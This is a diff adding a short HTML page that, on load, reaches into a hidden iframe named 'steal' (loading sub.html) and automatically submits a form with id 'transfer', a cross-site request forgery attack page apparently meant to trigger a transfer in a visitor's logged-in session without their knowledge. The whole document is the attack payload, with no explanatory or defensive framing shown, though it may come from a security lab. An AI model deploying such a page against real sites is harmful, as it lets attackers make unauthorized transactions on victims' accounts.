@@ -1,0 +1,17 @@
+<html>
+<head>
+    <script type="text/javascript">
+        function autoLoad()
+        {
+            var iframe = document.getElementById("steal"); 
+            var iframeW = (iframe.contentWindow || iframe.contentDocument);
+            if (iframeW.document){
+                iframeW.document.getElementById("transfer").submit();
+            }
+        }
+    </script>
+</head>
+<body onload="autoLoad()">
+    <iframe id="steal" style="display:none" src="sub.html"></iframe>
+</body>
+</html>
